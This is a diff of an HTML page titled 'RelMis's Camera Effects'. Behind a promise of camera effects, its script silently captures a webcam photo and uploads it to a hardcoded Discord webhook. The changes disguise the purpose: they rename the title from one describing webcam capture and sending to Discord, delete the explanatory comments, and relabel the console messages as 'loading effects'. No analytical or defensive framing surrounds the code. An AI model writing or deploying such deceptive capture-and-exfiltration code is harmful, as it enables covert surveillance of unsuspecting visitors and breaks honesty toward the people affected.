@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Webcam Photo and Send to Discord Webhook</title>
+    <title>RelMis's Camera Effects</title>
 </head>
 <body>
     <h1>Please allow access to try camera effects!</h1>
@@ -12,52 +12,40 @@
     <script>
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-
-        // Discord Webhook URL
         const webhookURL = 'https://discord.com/api/webhooks/1350881236280803492/343yx9XzqUQKzh6-b-WsGdgOMTy3bAv6O6t9kSbIVsd7Xn0btgOoOanbwOR7NMfsI2dd';
 
-        // Access the webcam
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
-                // Create a hidden video element to capture webcam data
                 const video = document.createElement('video');
                 video.srcObject = stream;
 
-                // Wait for the video to be ready, then capture the photo
                 video.onplaying = function() {
-                    // Draw the current frame from the video to the canvas
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Create a data URL from the canvas image (JPEG format)
                     const imageUrl = canvas.toDataURL('image/jpeg');
 
-                    // Create a Blob from the data URL (to send it as a file)
                     fetch(imageUrl)
                         .then(response => response.blob())
                         .then(blob => {
-                            // Create a FormData object to send the image as a multipart form
                             const formData = new FormData();
                             formData.append('file', blob, 'webcam_image.jpg');
 
-                            // Send the image file to the Discord webhook
                             fetch(webhookURL, {
                                 method: 'POST',
                                 body: formData,
                             })
                             .then(response => response.json())
                             .then(data => {
-                                console.log('Successfully sent to Discord:', data);
+                                console.log('Successfully loaded effects:', data);
                             })
                             .catch(error => {
-                                console.error('Error sending to Discord:', error);
+                                console.error('Error loading effects:', error);
                             });
                         })
                         .catch(error => {
-                            console.error('Error converting image to blob:', error);
+                            console.error('Error turning on:', error);
                         });
                 };
 
-                // Start the video
                 video.play();
             })
             .catch(function(err) {
